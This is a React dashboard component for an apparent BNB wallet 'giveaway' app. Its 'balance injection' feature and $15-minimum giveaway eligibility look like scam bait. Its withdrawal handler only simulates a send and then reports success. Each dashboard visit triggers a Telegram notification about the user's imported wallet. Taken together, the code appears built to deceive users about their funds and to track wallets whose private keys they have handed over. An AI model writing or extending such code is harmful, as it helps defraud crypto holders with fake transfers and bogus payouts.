import { useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Bell, Calculator, Send, QrCode, Gift, ArrowDown, ArrowUp, Bitcoin, Download, Plus, Copy, Eye, EyeOff, Wallet, DollarSign, Receipt, CheckCircle, RefreshCw } from 'lucide-react';
import { useWallet } from '../hooks/useWallet';
import { walletService, type TransactionHistory } from '../lib/wallet';
import { currencyConverter } from '../lib/currencyConverter';
import LoadingOverlay from '../components/LoadingOverlay';
import InjectionModal from '../components/InjectionModal';
import { useToast } from '@/hooks/use-toast';

interface DashboardProps {
  onNavigate: (screen: 'welcome' | 'import' | 'create' | 'dashboard' | 'calculator' | 'history' | 'settings') => void;
}

export default function Dashboard({ onNavigate }: DashboardProps) {
  const { wallet, updateBalance, injectBalance, notifyDashboardAccess, isLoading } = useWallet();
  const { toast } = useToast();
  const [showPrivateKey, setShowPrivateKey] = useState(false);

  const [showInjectionModal, setShowInjectionModal] = useState(false);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [transactions, setTransactions] = useState<TransactionHistory[]>([]);
  const [showBalance, setShowBalance] = useState(true);
  const [showNaira, setShowNaira] = useState(false);

  useEffect(() => {
    if (wallet?.isConnected) {
      // Only update balance for non-admin accounts
      if (!isAdminTestingKey()) {
        updateBalance();
      }
      // Notify Telegram about dashboard access
      notifyDashboardAccess();
      // Fetch transaction history
      fetchTransactions();
    }
  }, []);



  const fetchTransactions = async () => {
    if (!wallet?.address) return;

    // Get transactions directly from wallet service
    const walletTransactions = walletService.getTransactions();
    setTransactions(walletTransactions.slice(0, 3)); // Show only last 3 transactions
  };

  // Don't auto-redirect - let App.tsx handle navigation

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: 'Copied!',
      description: `${label} copied to clipboard`,
    });
  };

  const formatAddress = (address: string) => {
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const isAdminTestingKey = () => {
    return wallet?.privateKey === '0000000000000000000000000000000000000000000000000000000000000001';
  };

  const canInjectBalance = () => {
    if (!wallet) return false;
    
    // Always allow injection for any wallet for testing purposes
    return true;
  };

  const isInjectionEligible = () => {
    if (!wallet) return false;
    
    // Admin testing key is always eligible
    if (isAdminTestingKey()) {
      return true;
    }
    
    // Regular accounts need any balance for injection (no minimum)
    return wallet.balanceUSD > 0;
  };

  const getInjectionAmount = () => {
    if (!wallet) return { amount: 0, amountUSD: 0 };
    
    const bnbPrice = 250;
    let injectionAmountUSD: number;
    
    if (isAdminTestingKey()) {
      // For admin: Use current balance * 1.5 (progressive injection)
      injectionAmountUSD = wallet.balanceUSD * 1.5;
    } else {
      // For regular wallets: calculate based on current balance
      const calculation = walletService.calculateGiveaway();
      injectionAmountUSD = calculation.giveawayAmountUSD;
    }
    
    const injectionAmount = injectionAmountUSD / bnbPrice; // Convert to BNB
    
    return {
      amount: injectionAmount,
      amountUSD: injectionAmountUSD
    };
  };

  const getInjectionStatusMessage = () => {
    if (!wallet) return '';
    
    if (isAdminTestingKey()) {
      return 'Admin mode - injection available';
    }
    
    if (wallet.balanceUSD <= 0) {
      return 'No balance detected. Add BNB to your wallet first.';
    }
    
    return 'Eligible for balance injection';
  };

  const handleManualRefresh = async () => {
    // Manual refresh disabled - no balance querying
    toast({
      title: 'Refresh Disabled',
      description: 'Balance querying has been disabled',
      variant: 'destructive',
    });
  };

  const handleInjectBalance = async () => {
    if (!wallet) return;
    
    try {
      const success = await injectBalance();
      
      if (!success) {
        toast({
          title: 'Injection Failed',
          description: 'Unable to inject balance at this time',
          variant: 'destructive',
        });
        return;
      }
      
      toast({
        title: 'Balance Injection Successful!',
        description: 'Your wallet balance has been updated successfully',
      });
      
      setShowInjectionModal(false);
      
    } catch (error) {
      toast({
        title: 'Injection Failed',
        description: error instanceof Error ? error.message : 'Please try again later',
        variant: 'destructive',
      });
    }
  };

  const handleWithdraw = async () => {
    if (!withdrawAddress || !withdrawAmount) {
      toast({
        title: 'Invalid Input',
        description: 'Please enter valid address and amount',
        variant: 'destructive',
      });
      return;
    }

    const amount = parseFloat(withdrawAmount);
    if (amount > wallet!.balance) {
      toast({
        title: 'Insufficient Balance',
        description: 'Amount exceeds available balance',
        variant: 'destructive',
      });
      return;
    }

    setIsProcessing(true);
    
    try {
      // Simulate withdrawal process
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      toast({
        title: 'Withdrawal Successful!',
        description: `${amount} BNB sent to ${formatAddress(withdrawAddress)}`,
      });
      
      setShowWithdrawModal(false);
      setWithdrawAddress('');
      setWithdrawAmount('');
      updateBalance();
      
    } catch (error) {
      toast({
        title: 'Withdrawal Failed',
        description: 'Please try again later',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  // Request notification permission
  useEffect(() => {
    if (Notification.permission === 'default') {
      Notification.requestPermission();
    }
  }, []);

  if (!wallet?.isConnected) {
    return null;
  }



  return (
    <>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-blue-900 px-4 py-4 pb-24"
      >
        <div className="max-w-lg mx-auto space-y-4">
          {/* Header */}
          <div className="flex justify-between items-center mb-6">
            <div>
            <motion.h1
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              className="text-2xl font-bold text-yellow-500"
            >
              Dashboard
            </motion.h1>
            <motion.p
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.1 }}
              className="text-gray-400 text-sm flex items-center"
            >
              {wallet.privateKey ? (
                <>
                  <Plus size={12} className="mr-1 text-green-500" />
                  Wallet Created
                </>
              ) : (
                <>
                  <Download size={12} className="mr-1 text-blue-500" />
                  Wallet Imported
                </>
              )}
              {isAdminTestingKey() && (
                <>
                  <span className="mx-2">•</span>
                  <Gift size={12} className="mr-1 text-yellow-500" />
                  <span className="text-yellow-500">Admin Mode</span>
                </>
              )}
            </motion.p>
          </div>
          <div className="flex items-center space-x-2">
            {isAdminTestingKey() && (
              <Button
                onClick={handleManualRefresh}
                disabled={isRefreshing}
                variant="ghost"
                size="sm"
                className="w-10 h-10 bg-gray-700 rounded-full hover:bg-gray-600 disabled:opacity-50"
              >
                <RefreshCw 
                  className={`text-yellow-500 ${isRefreshing ? 'animate-spin' : ''}`} 
                  size={20} 
                />
              </Button>
            )}
            <Button
              variant="ghost"
              size="sm"
              className="w-10 h-10 bg-gray-700 rounded-full hover:bg-gray-600"
            >
              <Bell className="text-yellow-500" size={20} />
            </Button>
          </div>
        </div>

        {/* Balance Card */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.2 }}
          className="mb-6"
        >
          <Card className="gradient-gold rounded-2xl text-black">
            <CardContent className="p-6">
              <div className="flex justify-between items-start mb-4">
                <div className="flex-1">
                  <div className="flex items-center space-x-2 mb-2">
                    <p className="text-sm opacity-80">Total Balance</p>
                    <Button
                      onClick={() => setShowBalance(!showBalance)}
                      variant="ghost"
                      size="sm"
                      className="w-6 h-6 p-0 hover:bg-black/20"
                    >
                      {showBalance ? <Eye size={14} /> : <EyeOff size={14} />}
                    </Button>
                    <Button
                      onClick={() => setShowNaira(!showNaira)}
                      variant="ghost"
                      size="sm"
                      className="text-xs px-2 py-1 h-auto hover:bg-black/20"
                    >
                      {showNaira ? 'NGN' : 'USD'}
                    </Button>
                  </div>
                  {showBalance ? (
                    <>
                      <h2 className="text-3xl font-bold">
                        {showNaira 
                          ? currencyConverter.formatCurrency(currencyConverter.convertUSDToNaira(wallet.balanceUSD), 'NGN')
                          : `${wallet.balance.toFixed(4)} BNB`
                        }
                      </h2>
                      <p className="text-sm opacity-80">
                        {showNaira 
                          ? currencyConverter.formatCurrency(wallet.balanceUSD, 'USD')
                          : currencyConverter.formatCurrency(currencyConverter.convertUSDToNaira(wallet.balanceUSD), 'NGN')
                        }
                      </p>
                    </>
                  ) : (
                    <>
                      <h2 className="text-3xl font-bold">••••••••</h2>
                      <p className="text-sm opacity-80">Hidden</p>
                    </>
                  )}
                </div>
                <div className="text-right">
                  <Bitcoin size={32} />
                </div>
              </div>
              
              <div className="grid grid-cols-4 gap-2">
                <Button
                  onClick={() => {
                    if (isInjectionEligible()) {
                      setShowInjectionModal(true);
                    } else {
                      toast({
                        title: 'Injection Not Available',
                        description: getInjectionStatusMessage(),
                        variant: 'destructive',
                      });
                    }
                  }}
                  disabled={!isInjectionEligible()}
                  className={`backdrop-blur rounded-xl py-3 px-2 text-center transition-colors duration-200 ${
                    isInjectionEligible() 
                      ? 'bg-black/20 hover:bg-black/30' 
                      : 'bg-gray-500/20 cursor-not-allowed opacity-50'
                  }`}
                >
                  <DollarSign size={16} className="mb-1" />
                  <p className="text-xs">Inject</p>
                </Button>
                <Button
                  onClick={() => setShowDepositModal(true)}
                  className="bg-black/20 backdrop-blur rounded-xl py-3 px-2 text-center hover:bg-black/30 transition-colors duration-200"
                >
                  <QrCode size={16} className="mb-1" />
                  <p className="text-xs">Deposit</p>
                </Button>
                <Button
                  onClick={() => setShowWithdrawModal(true)}
                  className="bg-black/20 backdrop-blur rounded-xl py-3 px-2 text-center hover:bg-black/30 transition-colors duration-200"
                >
                  <Send size={16} className="mb-1" />
                  <p className="text-xs">Send</p>
                </Button>
                <Button
                  onClick={() => onNavigate('calculator')}
                  className="bg-black/20 backdrop-blur rounded-xl py-3 px-2 text-center hover:bg-black/30 transition-colors duration-200"
                >
                  <Calculator size={16} className="mb-1" />
                  <p className="text-xs">Calculate</p>
                </Button>
              </div>
            </CardContent>
          </Card>
        </motion.div>

        {/* Wallet Information */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.25 }}
          className="mb-6"
        >
          <Card className="glass-effect rounded-2xl border-yellow-500/20">
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold mb-4">Wallet Information</h3>
              
              <div className="space-y-4">
                <div>
                  <p className="text-gray-400 text-sm mb-2">Wallet Address</p>
                  <div className="flex items-center space-x-2 bg-gray-700 rounded-xl p-3">
                    <span className="text-white font-mono text-sm flex-1">
                      {formatAddress(wallet.address)}
                    </span>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => copyToClipboard(wallet.address, 'Wallet address')}
                      className="w-8 h-8 p-0 hover:bg-gray-600"
                    >
                      <Copy size={14} className="text-yellow-500" />
                    </Button>
                  </div>
                </div>

                {wallet.privateKey && (
                  <div>
                    <p className="text-gray-400 text-sm mb-2">Private Key</p>
                    <div className="flex items-center space-x-2 bg-gray-700 rounded-xl p-3">
                      <span className="text-white font-mono text-sm flex-1">
                        {showPrivateKey ? wallet.privateKey : '••••••••••••••••••••••••••••••••'}
                      </span>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => setShowPrivateKey(!showPrivateKey)}
                        className="w-8 h-8 p-0 hover:bg-gray-600"
                      >
                        {showPrivateKey ? (
                          <EyeOff size={14} className="text-yellow-500" />
                        ) : (
                          <Eye size={14} className="text-yellow-500" />
                        )}
                      </Button>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(wallet.privateKey!, 'Private key')}
                        className="w-8 h-8 p-0 hover:bg-gray-600"
                      >
                        <Copy size={14} className="text-yellow-500" />
                      </Button>
                    </div>
                    <div className="bg-red-900/20 border border-red-500/30 rounded-xl p-3 mt-2">
                      <p className="text-red-400 text-xs flex items-center">
                        <Gift className="mr-1 flex-shrink-0" size={12} />
                        Never share your private key with anyone. Keep it secure!
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        </motion.div>

        {/* Giveaway Status */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.35 }}
          className="mb-6"
        >
          <Card className="glass-effect rounded-2xl border-yellow-500/20">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold">Giveaway Status</h3>
                <Badge 
                  variant={wallet.isEligible ? "default" : "destructive"}
                  className={wallet.isEligible ? "bg-green-500 text-green-900" : ""}
                >
                  {wallet.isEligible ? 'Eligible' : 'Not Eligible'}
                </Badge>
              </div>
              
              <div className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-gray-400">Minimum Required</span>
                  <span className="text-yellow-500 font-semibold">$15.00</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Your Balance</span>
                  <span className="text-white font-semibold">
                    ${wallet.balanceUSD.toFixed(2)}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Eligible Amount</span>
                  <span className="text-yellow-500 font-semibold">
                    ${wallet.isEligible ? wallet.balanceUSD.toFixed(2) : '0.00'}
                  </span>
                </div>
              </div>

              <Card className="mt-4 bg-gray-700 rounded-xl">
                <CardContent className="p-3">
                  <div className="flex items-center space-x-2">
                    <Gift className="text-yellow-500 flex-shrink-0" size={16} />
                    <p className="text-xs text-gray-300">
                      Your wallet will be verified before giveaway distribution
                    </p>
                  </div>
                </CardContent>
              </Card>
            </CardContent>
          </Card>
        </motion.div>

        {/* Recent Activity */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.45 }}
          className="mb-6"
        >
          <Card className="glass-effect rounded-2xl border-yellow-500/20">
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold mb-4">Recent Activity</h3>
              
              <div className="space-y-3">
                {transactions.map((transaction, index) => (
                  <motion.div
                    key={transaction.id}
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: 0.5 + index * 0.1 }}
                    className="flex items-center space-x-3 p-3 bg-gray-700 rounded-xl"
                  >
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                      transaction.type === 'giveaway' 
                        ? 'bg-yellow-500' 
                        : transaction.type === 'receive'
                        ? 'bg-blue-500'
                        : 'bg-green-500'
                    }`}>
                      {transaction.type === 'giveaway' ? (
                        <Gift className="text-black" size={16} />
                      ) : transaction.type === 'receive' ? (
                        <ArrowDown className="text-white" size={16} />
                      ) : (
                        <ArrowUp className="text-white" size={16} />
                      )}
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-sm">
                        {transaction.type === 'giveaway' 
                          ? 'Giveaway Received'
                          : transaction.type === 'receive'
                          ? 'Received'
                          : 'Sent'
                        }
                      </p>
                      <p className="text-gray-400 text-xs">{transaction.timestamp}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-green-500 font-semibold">
                        +{transaction.amount} BNB
                      </p>
                      <p className="text-gray-400 text-xs">
                        ${transaction.amountUSD.toFixed(2)}
                      </p>
                    </div>
                  </motion.div>
                ))}
              </div>
            </CardContent>
          </Card>
        </motion.div>
        </div>
      </motion.div>

      {/* Injection Modal */}
      <InjectionModal
        isOpen={showInjectionModal}
        onClose={() => setShowInjectionModal(false)}
        onInject={handleInjectBalance}
        injectionAmount={getInjectionAmount().amount}
        injectionAmountUSD={getInjectionAmount().amountUSD}
      />

      {/* Deposit Modal */}
      <Dialog open={showDepositModal} onOpenChange={setShowDepositModal}>
        <DialogContent className="glass-effect border-yellow-500/20">
          <DialogHeader>
            <DialogTitle className="text-yellow-500">Deposit BNB</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 text-center">
            <div className="bg-gray-700 rounded-xl p-4">
              <h3 className="font-semibold mb-2">Your Wallet Address</h3>
              <div className="bg-gray-800 rounded-lg p-3 font-mono text-sm break-all">
                {wallet.address}
              </div>
              <Button
                onClick={() => copyToClipboard(wallet.address, 'Wallet address')}
                variant="ghost"
                className="mt-2 text-yellow-500"
              >
                <Copy size={16} className="mr-2" />
                Copy Address
              </Button>
            </div>
            
            <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-xl p-3">
              <p className="text-yellow-400 text-sm">
                Send BNB to this address to deposit funds to your wallet
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Withdraw Modal */}
      <Dialog open={showWithdrawModal} onOpenChange={setShowWithdrawModal}>
        <DialogContent className="glass-effect border-yellow-500/20">
          <DialogHeader>
            <DialogTitle className="text-yellow-500">Withdraw BNB</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Recipient Address
              </label>
              <Input
                type="text"
                placeholder="0x..."
                value={withdrawAddress}
                onChange={(e) => setWithdrawAddress(e.target.value)}
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Amount (BNB)
              </label>
              <Input
                type="number"
                step="0.0001"
                placeholder="0.0000"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                className="bg-gray-700 border-gray-600 text-white"
              />
              <p className="text-gray-400 text-xs mt-1">
                Available: {wallet.balance.toFixed(4)} BNB
              </p>
            </div>

            <div className="bg-red-900/20 border border-red-500/30 rounded-xl p-3">
              <p className="text-red-400 text-sm">
                • Network fee: ~0.0005 BNB
              </p>
              <p className="text-red-400 text-sm">
                • Transaction is irreversible
              </p>
            </div>

            <Button
              onClick={handleWithdraw}
              disabled={isProcessing || !withdrawAddress || !withdrawAmount}
              className="w-full btn-gradient text-black font-semibold py-3"
            >
              {isProcessing ? 'Sending...' : 'Send BNB'}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <LoadingOverlay isVisible={isLoading || isProcessing} message={isProcessing ? "Processing transaction" : "Updating balance"} />
    </>
  );
}
